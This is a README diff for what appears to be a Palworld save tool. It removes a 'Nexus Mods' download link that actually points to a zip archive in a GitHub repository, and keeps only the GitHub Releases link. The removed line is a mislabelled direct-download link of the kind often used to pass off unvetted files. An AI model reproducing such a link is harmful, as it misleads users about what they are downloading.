@@ -13,7 +13,7 @@
 [![NexusMods](https://img.shields.io/badge/NexusMods-Download-orange)](https://www.nexusmods.com/palworld/mods/3190)
 [![Discord](https://img.shields.io/badge/Discord-Join_for_support-blue)](https://discord.gg/sYcZwcT4cT)
 
-**Download:** [GitHub Releases](https://github.com/ArianabHIhi9/Palworld-Save-Tools-2026/releases/tag/releases) · [Nexus Mods](https://github.com/ArianabHIhi9/Palworld-Save-Tools-2026/releases/download/releases/Latest.Release.v1.9.1.zip)
+**Download:** [GitHub Releases](https://github.com/ArianabHIhi9/Palworld-Save-Tools-2026/releases/tag/releases)
 
 ---
 
